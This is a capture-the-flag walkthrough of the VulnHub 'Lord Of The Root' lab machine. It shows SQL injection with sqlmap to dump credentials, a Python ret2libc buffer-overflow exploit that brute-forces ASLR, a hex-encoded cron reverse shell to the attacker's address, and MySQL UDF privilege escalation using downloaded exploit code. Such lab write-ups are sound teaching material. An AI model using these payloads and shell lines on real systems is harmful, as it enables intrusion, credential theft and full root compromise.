---
title: VulnHub - Lord Of The Root 1.0.1
author: ret2x
date: 2021-11-03 17:00:00 +0800
categories: [Walkthrough, VulnHub]
tags: [vulnhub, sqli, bof, mysql udf]
image:
    path: /assets/images/lordoftheroot/front.png
---

**Description:** A linux machine that involves additional enumeration to discover a web application vulnerable to SQL Injection and thus gain the first foothold. To escalate to root privileges I figured two ways, the first is through a vulnerable binary with SUID permissions, the second is targeted to MySQL via user defined functions capability, since this is running with root permissions.

**Author:** KookSec

**Operating System:** Linux

**Download:** [https://www.vulnhub.com/entry/lord-of-the-root-101,129/](https://www.vulnhub.com/entry/lord-of-the-root-101,129/)

## Information Gathering
### Host Discovery

On the local network the target machine was discovered using an ARP scan.

```console
root@kali:~$ netdiscover -I vmnet1 -r 192.168.179.1/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts  
                                                                 
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 84
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.179.161 00:0c:29:05:a0:43      1      42  VMware, Inc.  
 192.168.179.254 00:50:56:ea:b7:4a      1      42  VMware, Inc.
```

### Port Scanning

I performed a full UDP/TCP scan with unicornscan, the only TCP service available is SSH.

```console
root@kali:~$ us -mT -Iv -p 1-65535 192.168.179.161 -r 3000 -R 3 && us -mU -Iv -p 1-65535 192.168.179.161 -r 3000 -R 3
adding 192.168.179.161/32 mode `TCPscan' ports `1-65535' pps 3000
using interface(s) vmnet1
scaning 1.00e+00 total hosts with 1.97e+05 total packets, should take a little longer than 1 Minutes, 12 Seconds
TCP open 192.168.179.161:22  ttl 64
sender statistics 2923.0 pps with 196605 packets sent total
listener statistics 6 packets recieved 0 packets droped and 0 interface drops
TCP open                     ssh[   22]         from 192.168.179.161  ttl 64 
adding 192.168.179.161/32 mode `UDPscan' ports `1-65535' pps 3000
using interface(s) vmnet1
scaning 1.00e+00 total hosts with 1.97e+05 total packets, should take a little longer than 1 Minutes, 12 Seconds
UDP open 192.168.179.161:57025  ttl 64
sender statistics 2883.0 pps with 196632 packets sent total
listener statistics 4 packets recieved 0 packets droped and 0 interface drops
UDP open                 unknown[57025]         from 192.168.179.161  ttl 64
```

### SSH Enumeration

I connected to SSH and could see on the banner a number sequence from 1 to 3 to perform port knocking.

```console
root@kali:~$ ssh 192.168.179.161
The authenticity of host '192.168.179.161 (192.168.179.161)' can't be established.
ECDSA key fingerprint is SHA256:XzDLUMxo8ifHi4SciYJYj702X3PfFwaXyKOS07b6xd8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.179.161' (ECDSA) to the list of known hosts.

                                                  .____    _____________________________
                                                  |    |   \_____  \__    ___/\______   \
                                                  |    |    /   |   \|    |    |       _/
                                                  |    |___/    |    \    |    |    |   \
                                                  |_______ \_______  /____|    |____|_  /
                                                          \/       \/                 \/
 ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________
|      <  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \
|    |  \|   |  (  <_> )  \___|    <   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  <_> )  |        \   |  \  | \  ___/|  | \/
|____|__ \___|  /\____/ \___  >__|_ \  \___  /   |__|  |__|\___  >___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  >__|
        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
Easy as 1,2,3
root@192.168.179.161's password: 
```

With a oneliner bash script I connected to ports 1,2,3 sequentially.

```console
root@kali:~$ for x in 1 2 3; do nc -w 1 192.168.179.161 $x; done
(UNKNOWN) [192.168.179.161] 1 (tcpmux) : Connection timed out
(UNKNOWN) [192.168.179.161] 2 (?) : Connection timed out
(UNKNOWN) [192.168.179.161] 3 (?) : Connection timed out
```

The target machine was rescanned to detect possible open ports.

```console
root@kali:~$ us -mT -Iv -p 1-65535 192.168.179.161 -r 3000 -R 3 && us -mU -Iv -p 1-65535 192.168.179.161 -r 3000 -R 3
adding 192.168.179.161/32 mode `TCPscan' ports `1-65535' pps 3000
using interface(s) vmnet1
scaning 1.00e+00 total hosts with 1.97e+05 total packets, should take a little longer than 1 Minutes, 12 Seconds
TCP open 192.168.179.161:1337  ttl 64
TCP open 192.168.179.161:22  ttl 64
sender statistics 2826.7 pps with 196605 packets sent total
listener statistics 12 packets recieved 0 packets droped and 0 interface drops
TCP open                     ssh[   22]         from 192.168.179.161  ttl 64 
TCP open          menandmice-dns[ 1337]         from 192.168.179.161  ttl 64
```

With nmap, service detection and script scanning was performed.

```console
root@kali:~$ nmap -sV -sC -n -v -p22,1337 192.168.179.161 -oN nmap/service-enum.txt
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)
|   2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)
|   256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)
|_  256 34:ec:16:dd:a7:cf:2a:86:45:ec:65:ea:05:43:89:21 (ED25519)
1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
```

### Web Enumeration

A web page is running on port 1337, but doesn't contain anything, to more than one image.

![](/assets/images/lordoftheroot/screenshot-1.png)

Checking the robots.txt file, a base64 string is commented in the page source.

![](/assets/images/lordoftheroot/screenshot-2.png)

![](/assets/images/lordoftheroot/screenshot-3.png)

I decoded the base64 string 2 times and got a new web path.

```console
root@kali:~$ curl -s http://192.168.179.161:1337/robots.txt | grep -oP 'TH[^>]*' | base64 -d | base64 -d 2>/dev/null 
/978345210/index.php
```

I accessed it, and it redirected me to a login page.

![](/assets/images/lordoftheroot/screenshot-4.png)

## Exploitation
### SQL Injection

To further test the login form I used sqlmap, this detected a SQL Injection vulnerability in the username parameter.

```console
root@kali:~$ sqlmap -u http://192.168.179.161:1337/978345210/index.php --data "username=admin&password=password&submit=+Login+" --risk 3 --level 5
...
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 4856 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 8370 FROM (SELECT(SLEEP(5)))txxC)-- bzWz&password=password&submit= Login
---
[21:42:20] [INFO] the back-end DBMS is MySQL
...
```

Listing the available databases.

```console
root@kali:~$ sqlmap -u http://192.168.179.161:1337/978345210/index.php --data "username=admin&password=password&submit=+Login+" --risk 3 --level 5 --dbms=mysql --dbs
...
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] Webapp
```

Retrieving the users table from the Webapp database.

```console
root@kali:~$ sqlmap -u http://192.168.179.161:1337/978345210/index.php --data "username=admin&password=password&submit=+Login+" --risk 3 --level 5 --dbms=mysql -D Webapp --tables
...
Users
Database: Webapp
[1 table]
+-------+
| Users |
+-------+
```

Listing the columns from the table users.

```console
root@kali:~$ sqlmap -u http://192.168.179.161:1337/978345210/index.php --data "username=admin&password=password&submit=+Login+" --risk 3 --level 5 --dbms=mysql -D Webapp -T Users --columns
...
Database: Webapp
Table: Users
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int(10)      |
| password | varchar(255) |
| username | varchar(255) |
+----------+--------------+
```

Retrieving the user credentials from the table users.

```console
root@kali:~$ sqlmap -u http://192.168.179.161:1337/978345210/index.php --data "username=admin&password=password&submit=+Login+" --risk 3 --level 5 --dbms=mysql -D Webapp -T Users -C id,username,password --dump
...
Database: Webapp
Table: Users
[5 entries]
+----+----------+------------------+
| id | username | password         |
+----+----------+------------------+
| 1  | frodo    | iwilltakethering |
| 2  | smeagol  | MyPreciousR00t   |
| 3  | aragorn  | AndMySword       |
| 4  | legolas  | AndMyBow         |
| 5  | gimli    | AndMyAxe         |
+----+----------+------------------+
```


### Access via SSH

The credentials are in plain text, so we don't need to crack them, with the user smeagol, I was able to access via SSH.

```console
smeagol@192.168.179.161's password: 
Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 3.19.0-25-generic i686)

 * Documentation:  https://help.ubuntu.com/

                            .____    _____________________________                              
                            |    |   \_____  \__    ___/\______   \                             
                            |    |    /   |   \|    |    |       _/                             
                            |    |___/    |    \    |    |    |   \                             
                            |_______ \_______  /____|    |____|_  /                             
                                    \/       \/                 \/                              
 __      __       .__                                ___________      .__                   .___
/  \    /  \ ____ |  |   ____  ____   _____   ____   \_   _____/______|__| ____   ____    __| _/
\   \/\/   // __ \|  | _/ ___\/  _ \ /     \_/ __ \   |    __) \_  __ \  |/ __ \ /    \  / __ | 
 \        /\  ___/|  |_\  \__(  <_> )  Y Y  \  ___/   |     \   |  | \/  \  ___/|   |  \/ /_/ | 
  \__/\  /  \___  >____/\___  >____/|__|_|  /\___  >  \___  /   |__|  |__|\___  >___|  /\____ | 
       \/       \/          \/            \/     \/       \/                  \/     \/      \/ 
Last login: Tue Sep 22 12:59:38 2015 from 192.168.55.135
smeagol@LordOfTheRoot:~$ id
uid=1000(smeagol) gid=1000(smeagol) groups=1000(smeagol)
```

Listing the SUID binary files, three of them catch my attention.

```console
smeagol@LordOfTheRoot:~$ find / -perm -4000 -type f 2>/dev/null 
...
/SECRET/door2/file
/SECRET/door1/file
/SECRET/door3/file
...
```

### SUID Binary

So I tried to cause a crash passing it 500 characters as parameter.

```console
smeagol@LordOfTheRoot:~$ for x in {1..3}; do echo $x; /SECRET/door$x/file $(python -c 'print("A"*500)'); done
1
2
Segmentation fault (core dumped)
3
```

The crash was triggered on the file of the door2, since this vulnerable binary randomly switches doors in a certain period of time, I decided to make a copy of this to another directory.

```console
smeagol@LordOfTheRoot:~$ ls -la /SECRET/door* | grep file
-rwsr-xr-x 1 root root 7370 Sep 17  2015 file
-rwsr-xr-x 1 root root 5150 Sep 22  2015 file
-rwsr-xr-x 1 root root 7370 Sep 17  2015 file

smeagol@LordOfTheRoot:~$ cp /SECRET/door2/file .
```

Before to start debugging, I was able to detect that the ASLR protection is enabled, since we can see that only two values of the memory address are changing, we can brute force to bypass this.

```console
smeagol@LordOfTheRoot:~$ cat /proc/sys/kernel/randomize_va_space
2
smeagol@LordOfTheRoot:~$ ldd file | grep 'libc'
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7546000)
smeagol@LordOfTheRoot:~$ ldd file | grep 'libc'
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7521000)
smeagol@LordOfTheRoot:~$ ldd file | grep 'libc'
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb752e000)
```

Exists a technique named ret2lib, this does not require of a shellcode to exploit it, we need to find the memory address of **system, exit and shell**, as shown below:

```console
smeagol@LordOfTheRoot:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -w 'system'
  1443: 00040190    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
  
smeagol@LordOfTheRoot:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -w 'exit'
   139: 000331e0    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
  
smeagol@LordOfTheRoot:~$ strings -atx /lib/i386-linux-gnu/libc.so.6 | grep '/bin/sh'
 160a24 /bin/sh
```

The following python script helped me to brute force and exploit the vulnerable binary automatically, an interesting article that talks about this topic you can find it [here](https://akshit-singhal.medium.com/how-to-bypass-aslr-to-perform-buffer-overflow-attacks-2d5f6707399c).

```python
from subprocess import call
import struct,os

libc_address=0xb7578000

system=0x00040190
exit=0x000331e0
shell=0x00160a24

system_addr=struct.pack("<I", libc_address + system)
exit_addr=struct.pack("<I", libc_address + exit)
shell_addr=struct.pack("<I", libc_address + shell)

buf="A"*171
buf+=system_addr
buf+=exit_addr
buf+=shell_addr

i,n=1,1

while(n < 4):
    x=os.path.getsize("/SECRET/door{}/file".format(n))
    if (x == 5150):
        print("[-] Door {} Open".format(n))
        while (i < 500):
            print(" Attempt {}".format(i))
            path="/SECRET/door{}/file".format(n)
            ret= call([path, buf])
            i+=1
    n+=1
    i=1

    if n==4:
        n=1
```

As we see, with few attempts was possible to exploit the binary and get a root shell.

```console
smeagol@LordOfTheRoot:~$ python exp.py
[-] Door 1 Open   
 ...
 Attempt 70
# id
uid=1000(smeagol) gid=1000(smeagol) euid=0(root) groups=0(root),1000(smeagol)
# python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/bash")'
root@LordOfTheRoot:/dev/shm# cd /root/
root@LordOfTheRoot:/root# ls
buf  buf.c  Flag.txt  other  other.c  switcher.py
```

In the root directory the switcher.py script randomly copy the buf file through a cron job that runs every three minutes.

```console
root@LordOfTheRoot:/root# cat switcher.py 
#!/usr/bin/python
import os
from random import randint

targets= ["/SECRET/door1/","/SECRET/door2/","/SECRET/door3/"]
for t in targets:
   os.system("rm "+t+"*")
   os.system("cp -p other "+t)
   os.system("cp -p "+t+"other "+t+"file")
   os.system("rm "+t+"other")

luckyDoor = randint(0,2)
t=targets[luckyDoor]
os.system("rm "+t+"*")
os.system("cp -p buf "+t)
os.system("cp -p "+t+"buf "+t+"file")
os.system("rm "+t+"buf")
```

```console
root@LordOfTheRoot:/root# crontab -l
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
*/3 * * * * /root/switcher.py
```

This is the vulnerable buf.c script.

```console
root@LordOfTheRoot:/root# cat buf.c 
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]){

        char buff[159];
        if(argc <2){
                printf("Syntax: %s <input string>\n", argv[0]);
                exit (0);

        }
  strcpy(buff, argv[1]);
  return 0;

}
```

This is the non-vulnerable other.c script.

```console
root@LordOfTheRoot:/root# cat other.c 
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]){

        char buff[150];
        if(argc <2){
                printf("Syntax: %s <input string>\n", argv[0]);
                exit (0);

        }
  //This Program does nothing
  return 0;

} 
```


### MySQL running with root permissions

Another path to get root is through MySQL, as it runs as root.

```console
smeagol@LordOfTheRoot:/$ ps aux | grep mysqld root      1360  0.6  0.1
318404   848 ?        Ssl  13:43   1:12 /usr/sbin/mysqld
```

The credentials to connect to MySQL are in the login.php file.

```console
smeagol@LordOfTheRoot:/var/www/978345210$ grep '$db ' login.php 
                $db = new mysqli('localhost', 'root', 'darkshadow', 'Webapp');
```
                      
I encoded to hexadecimal a reverse shell that runs every minute.

```console
LordOfTheRoot:~$ echo '* * * * * root /bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.179.1/443 0>&1"' | xxd -ps | tr -d '\n'; echo
2a202a202a202a202a20726f6f74202f62696e2f62617368202d6320222f62696e2f62617368202d69203e26202f6465762f7463702f3139322e3136382e3137392e312f34343320303e2631220a
```

I wrote the reverse shell in the /etc/cron.d directory using mysql.

```console
mysql> select 0x2a202a202a202a202a20726f6f74202f62696e2f62617368202d6320222f62696e2f62617368202d69203e26202f6465762f7463702f3139322e3136382e3137392e312f34343320303e2631220a into outfile '/etc/cron.d/back.door';
Query OK, 1 row affected (0.01 sec)
```

As we can see our reverse shell was written as root, but it doesn't is executed.

```console
smeagol@LordOfTheRoot:~$ ls -la /etc/cron.d/back.door -rw-rw-rw- 1 root
root 80 Nov 03 06:06 /etc/cron.d/back.door 
```

### MySQL User Defined Functions

This version of MySQL is affected by a vulnerability that allows users to run user-defined functions to execute commands in the context of MySQL, which in this case is root. access to MySQL as the root user is required.

```console
smeagol@LordOfTheRoot:~$ mysql --version 
mysql Ver 14.14 Distrib 5.5.44, for debian-linux-gnu (i686) using readline 6.3 
```

As we know the MySQL credentials and this is running as root only we just to look for a UDF exploit, there is an article how to exploit UDF [here](https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf).

```console
root@kali:~$ searchsploit mysql udf local
------------------------------------------------------------------------------------ -------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ -------------------------
MySQL 4.0.17 (Linux) - User-Defined Function (UDF) Dynamic Library (1)              | linux/local/1181.c
MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)             | linux/local/1518.c
MySQL 4/5/6 - UDF for Command Execution                                             | linux/local/7856.txt
------------------------------------------------------------------------------------ -------------------------
```

I copied the 1518.c exploit to my current directory, moved it to the web root, and started the apache service.

```console
root@kali:~$ searchsploit -m linux/local/1518.c
root@kali:~$ mv 1518.c /var/www/html
root@kali:~$ systemctl start apache2.service
```

On the target machine we download the UDF exploit, we compile it and create the shared library.

```console
smeagol@LordOfTheRoot:~$ wget 192.168.179.1/1518.c
smeagol@LordOfTheRoot:~$ gcc -g -c 1518.c -o raptor_udf2.o -fPIC
smeagol@LordOfTheRoot:~$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

We connect to mysql database. 

```console
smeagol@LordOfTheRoot:~$ mysql -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 5130
Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)

Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
mysql>
```

We switch to the MySQL database.

```console
mysql> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql>
```

We create a table to hold the exploit code.

```console
mysql> create table foo(line blob);
Query OK, 0 rows affected (0.01 sec)
```

We import the exploit inserting its content into the table.

```console
mysql> insert into foo values(load_file('/home/smeagol/raptor_udf2.so'));
Query OK, 1 row affected (0.01 sec)
```

We select the binary content and dump it into the plugins directory.

```console
mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
Query OK, 1 row affected (0.01 sec)
```

We create a function to call the exploit.

```console
mysql> create function do_system returns integer soname 'raptor_udf2.so';
Query OK, 0 rows affected (0.01 sec)


The following statement can be used to execute system commands as root
```

We can verify that the function exists.

```console
mysql> select * from mysql.func;
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function |
+-----------+-----+----------------+----------+
1 row in set (0.04 sec)
```

We copy the /bin/sh binary to tmp directory and we grant it SUID permissions.

```console
mysql> select do_system('cp /bin/sh /tmp/sh && chmod 4777 /tmp/sh');
+-------------------------------------------------------+
| do_system('cp /bin/sh /tmp/sh && chmod 4777 /tmp/sh') |
+-------------------------------------------------------+
|                                                     0 |
+-------------------------------------------------------+
1 row in set (0.01 sec)

mysql> quit;
Bye
```

As we can see our binary was copied, we execute it and get root.

```console
smeagol@LordOfTheRoot:~$ ls -la /tmp/sh 
-rwsrwxrwx 1 root root 112204 Nov  9 13:23 /tmp/sh
smeagol@LordOfTheRoot:~$ /tmp/sh
# id
uid=1000(smeagol) gid=1000(smeagol) euid=0(root) groups=0(root),1000(smeagol)
# python -c "import os; os.setuid(0); os.setgid(0); os.system('/bin/bash')"
root@LordOfTheRoot:~# cd /root
root@LordOfTheRoot:/root# ls
buf  buf.c  Flag.txt  other  other.c  switcher.py
root@LordOfTheRoot:/root# cat Flag.txt 
“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
– Gandalf
```
